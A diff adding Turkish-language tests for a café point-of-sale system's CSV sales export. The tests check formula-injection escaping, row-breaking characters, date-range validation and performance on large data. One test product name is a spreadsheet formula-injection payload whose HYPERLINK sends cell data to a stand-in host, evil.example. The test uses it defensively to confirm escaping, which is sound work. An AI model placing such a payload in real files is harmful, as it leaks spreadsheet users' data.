@@ -232,6 +232,58 @@ describe('raporlar denetimi', () => {
     for (const r of urunler.slice(1)) expect(r[ciro]).toMatch(/^\d{1,3}(\.\d{3})*,\d{2}$/);
   });
 
+  it('Raporlar › Aktarım (lafmaliyet satış listesi): POS adı formül olmaz, satırı bölmez; dönem raporlarla aynı denetlenir (input-69, input-66)', async () => {
+    await at('2026-10-26T12:30:00+03:00');
+    // POS adı Yönetim'de serbest metin: formül, satır sonu, sekme ve noktalı virgül
+    const categoryId = h.boot.categories[0]!.id;
+    const names = ['=HYPERLINK("http://evil.example/?d="&A1,"x")', 'KURABIYE\r\nLATTE M', 'SU\tSODA;LİMON', '-2+3'];
+    for (const [i, posName] of names.entries()) {
+      const p = await h.ok<{ id: string }>('patron', 'POST', '/admin/products', { categoryId, name: `Aktarım ${i}`, price: 5000 + i * 100, kdvRate: 10 });
+      await h.ok('patron', 'PATCH', `/admin/products/${p.id}`, { posName });
+      let o = await h.ok<OrderDTO>('kasa', 'POST', '/orders', { type: 'tezgah' });
+      o = await h.ok<OrderDTO>('kasa', 'POST', `/orders/${o.id}/items`, { items: [{ productId: p.id, qty: 1 }] });
+      await h.ok('kasa', 'POST', `/orders/${o.id}/payments`, { methodId: method('Nakit').id, amount: o.total });
+    }
+    const r = await h.call<string>('mudur', 'GET', '/sync/lafmaliyet/satislar.csv?from=2026-10-26&to=2026-10-26');
+    expect(r.status).toBe(200);
+    // lafmaliyet'in yapıştırma ayrıştırıcısı tırnak bilmez: her satır bir ürün, her satırda tam 3 hücre
+    const lines = r.json.replace(/^﻿/, '').split(/\r\n|\r|\n/).filter(Boolean);
+    expect(lines[0]).toBe('Ürün;Adet;Tutar');
+    for (const line of lines) {
+      expect(line.split(';'), line).toHaveLength(3);
+      expect(line, line).not.toMatch(/^[=+\-@\t]/);
+      expect(line, line).not.toContain('\t');
+    }
+    const rows = parseCsv(r.json);
+    expect(rows).toHaveLength(lines.length);
+    const written = rows.slice(1).map((x) => x[0]);
+    expect(written).toContain(`'=HYPERLINK("http://evil.example/?d="&A1,"x")`);
+    expect(written).toContain('KURABIYE LATTE M');
+    expect(written).toContain('SU SODA,LİMON');
+    expect(written).toContain("'-2+3");
+    // Adet sayı, tutar Türkçe para
+    for (const x of rows.slice(1)) {
+      expect(x[1]).toMatch(/^\d+$/);
+      expect(x[2]).toMatch(/^\d{1,3}(\.\d{3})*,\d{2}$/);
+    }
+
+    // Dönem: raporlarla aynı (en çok 400 gün, gerçek takvim günü), ters verilen çevrilir
+    const long = await h.call<{ code: string; error: string }>('mudur', 'GET', '/sync/lafmaliyet/satislar.csv?from=1990-01-01&to=2026-10-26');
+    expect(long.status).toBe(422);
+    expect(long.json.code).toBe('range_too_long');
+    expect(long.json.error).toMatch(/400 gün/);
+    for (const q of ['from=2026-13-01&to=2026-13-01', 'from=2026-02-30&to=2026-03-01', 'to=2026-04-31']) {
+      const bad = await h.call<{ code: string }>('mudur', 'GET', `/sync/lafmaliyet/satislar.csv?${q}`);
+      expect(bad.status, q).toBe(422);
+      expect(bad.json.code, q).toBe('validation');
+    }
+    const reversed = await h.call<string>('mudur', 'GET', '/sync/lafmaliyet/satislar.csv?from=2026-10-26&to=2026-10-19');
+    expect(reversed.status).toBe(200);
+    // Varsayılan dönem raporların "bugün"ü: açık iş günü
+    const def = await h.call<string>('mudur', 'GET', '/sync/lafmaliyet/satislar.csv');
+    expect(def.json).toBe(r.json);
+  });
+
   it('saatlik grafik iş günü sırasıyla: gece 01:30 satışı sabahki satışlardan sonra gelir (client-64)', async () => {
     await at('2026-10-27T01:30:00+03:00');
     await sale([{ name: 'Türk kahvesi', qty: 2 }]);
@@ -392,5 +444,15 @@ describe('raporlar denetimi', () => {
     expect(checks.rows).toHaveLength(300);
     expect(checks.rows[0]!.no).toBe(PER_DAY);
     expect(await csv(`type=adisyonlar&${q}`)).toHaveLength(N + 1);
+
+    // Raporlar › Aktarım (lafmaliyet satış listesi) de aynı dönemi okur: 500 değil, bütün satışlar tek satırda
+    const t0 = performance.now();
+    const satislar = await h.call<string>('mudur', 'GET', `/sync/lafmaliyet/satislar.csv?${q}`);
+    expect(satislar.status).toBe(200);
+    const lines = parseCsv(satislar.json);
+    expect(lines[0]).toEqual(['Ürün', 'Adet', 'Tutar']);
+    expect(lines.slice(1).map((r) => r.slice(1))).toEqual([[String(N), tlPlain(N * latte.price)]]);
+    // Kalemler adisyona göre bir kez gruplanır (adisyon başına bütün listeyi taramak 33.000 adisyonda karesel)
+    expect(performance.now() - t0).toBeLessThan(10_000);
   }, 120_000);
 });
